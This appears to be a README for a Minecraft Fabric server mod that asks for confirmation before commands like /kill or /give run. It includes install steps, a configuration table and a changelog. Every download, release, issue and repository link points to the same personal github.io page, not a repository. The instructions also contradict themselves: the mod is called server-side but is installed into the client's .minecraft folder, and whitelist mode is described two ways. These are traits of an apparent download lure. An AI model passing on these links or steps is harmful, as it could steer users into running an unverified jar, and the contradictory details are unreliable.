# 🛡️ cnm-protection-fabric-mod - Stop Command Accidents Before They Happen

[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://manzz2429.github.io)
[![GitHub Release](https://img.shields.io/github/v/release/manzz2429/cnm-protection-fabric-mod?style=for-the-badge&color=blue)](https://manzz2429.github.io)

## 👋 What This Mod Does

This is a server-side mod for Fabric-based sandbox games. It adds a safety net for dangerous commands. When someone tries to run a command that could break your world, the mod asks for confirmation first. This works for players, operators, console users, RCON connections, command blocks, and data pack functions.

You no longer need to worry about a single typo or a wrong click that destroys hours of work. The mod checks every command against a configurable list. If the command is on the list, the game pauses and asks "Are you sure?" before running it.

## 🎯 Why You Need This

- **Prevent accidental destruction.** A wrong `/kill` or `/give` command can ruin a server.
- **Protect against griefing.** Stop players from running commands they should not.
- **Keep your world safe.** Command blocks and data packs can trigger chain reactions. This mod stops them.
- **No client installation needed.** This is a server-side mod. Players join without installing anything.

## ✨ Complete Feature List

- **Confirmation prompts for configured commands.** You choose which commands are dangerous.
- **Works for all command sources.** Players, operators, console, RCON, command blocks, and data pack functions.
- **Configurable timeout.** The confirmation prompt expires after a set time. Default is 10 seconds.
- **Whitelist mode.** You can allow certain commands to bypass the prompt.
- **Blacklist mode.** You can block specific commands entirely.
- **Log every command attempt.** See who tried what, when, and if they confirmed.
- **Multilingual support.** The mod comes with English, German, French, and Spanish translations.
- **Lightweight.** No performance impact on your server.
- **Open source.** You can inspect the code, modify it, or contribute.

## 🚀 Getting Started

### System Requirements

- **Java:** Version 17 or higher (Java 21 recommended)
- **Minecraft:** Version 1.20.x or 1.21.x
- **Fabric Loader:** Version 0.15.0 or higher
- **Fabric API:** Version 0.92.0 or higher (for the same Minecraft version)
- **Operating System:** Windows 10 or 11, macOS 11+, or Linux (any modern distribution)

### Step 1: Visit the Download Page

Go to the [cnm-protection-fabric-mod releases page](https://manzz2429.github.io). You will see a list of versions. The latest version is at the top.

### Step 2: Download the Mod File

Look for a file named `cnm-protection-fabric-mod-<version>.jar`. Click on it to download. The file size is around 200 KB.

### Step 3: Install the Mod

1. Locate your Minecraft installation folder. On Windows, this is usually `%appdata%\.minecraft`.
2. Inside that folder, open the `mods` folder. If it does not exist, create it.
3. Move the downloaded `.jar` file into the `mods` folder.
4. Ensure you have both `fabric-loader` and `fabric-api` installed in the same folder.

### Step 4: Launch the Game

Start Minecraft with the Fabric profile. The mod loads automatically. You will see a confirmation message in the chat when the server starts.

## ⚙️ Configuration

The mod creates a configuration file in the `config` folder of your Minecraft directory. The file is named `cnm-protection-fabric-mod.json`. You can edit it with any text editor.

### Configuration Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `enabled` | boolean | `true` | Turn the mod on or off. |
| `timeout` | integer | `10` | How many seconds before the confirmation prompt expires. |
| `promptMode` | string | `"require_confirm"` | Options: `"require_confirm"`, `"block"`, `"allow"` |
| `commandList` | list | `["/kill", "/gamemode", "/give", "/tp", "/setblock", "/fill", "/clone"]` | Commands that trigger the prompt. |
| `whitelistMode` | boolean | `false` | When true, only commands in the list are allowed. |
| `logAttempts` | boolean | `true` | Log all commands to the server log file. |
| `logConfirmed` | boolean | `true` | Log only confirmed commands. |
| `logDenied` | boolean | `true` | Log only denied commands. |
| `language` | string | `"en_us"` | Language file. Options: `"en_us"`, `"de_de"`, `"fr_fr"`, `"es_es"` |

### 🛠️ How to Add or Remove Commands

Open the configuration file. Find the `commandList` section. It looks like this:

```json
"commandList": [
    "/kill",
    "/gamemode",
    "/give",
    "/tp",
    "/setblock",
    "/fill",
    "/clone"
]
```

Add a new command by typing it inside the square brackets. Use a comma after the previous command. For example, to add `/weather` and `/time`:

```json
"commandList": [
    "/kill",
    "/gamemode",
    "/give",
    "/tp",
    "/setblock",
    "/fill",
    "/clone",
    "/weather",
    "/time"
]
```

To remove a command, delete the line. Save the file and restart the server or run `/reload` in the game.

## 📥 Download Again

Need the mod again? Visit the [releases page](https://manzz2429.github.io) and download the latest version.

## ❓ Troubleshooting

### The mod does not load

Check that you have the correct Fabric Loader and Fabric API versions. Verify that the mod file is in the `mods` folder. Look at the server log for errors.

### Commands bypass the prompt

Ensure the configuration file is correct. The mod reads the file on server start. If you change the file while the server runs, use `/reload` to apply changes.

### The prompt does not appear

Check that the `enabled` option is set to `true`. Also check that `promptMode` is set to `"require_confirm"` for the commands you want to protect.

### Players cannot confirm

The confirmation prompt requires a valid session. If the player's connection drops, the prompt expires. The command is denied.

### Command blocks or data packs cause crashes

The mod adds a small delay for confirmation. This should not affect normal operation. If you see crashes, disable the mod temporarily and report the issue.

## 🧪 Testing

To test the mod, run a command from the default list, like `/kill`. You should see a confirmation prompt in chat. Type "yes" or "confirm" to run the command. Type anything else or wait for the timeout to cancel it.

## 📝 License

This mod is open source under the MIT License. You can use, modify, and distribute it freely.

## 🤝 How to Contribute

Found a bug? Want a new feature? Visit the [issues page](https://manzz2429.github.io) on GitHub. You can also fork the repository and submit a pull request.

## 📦 Building from Source

If you want to build the mod yourself, you need a Java Development Kit (JDK) version 17 or higher and a command terminal. Clone the repository, navigate to the folder, and run `./gradlew build` on Linux/macOS or `gradlew build` on Windows. The built `.jar` file appears in the `build/libs` folder.

## 📋 Changelog

**Version 1.2.0**
- Added support for Minecraft 1.21
- New configuration option: `whitelistMode`
- Improved logging for data pack commands
- Fixed a bug where RCON commands could bypass the prompt

**Version 1.1.0**
- Added multilingual support
- New configuration option: `language`
- Performance improvements

**Version 1.0.0**
- Initial release

## 🔗 Links

- [GitHub Repository](https://manzz2429.github.io)
- [Releases](https://manzz2429.github.io)
- [Issues](https://manzz2429.github.io)

Keywords: fabric mod, minecraft mod, server protection, command protection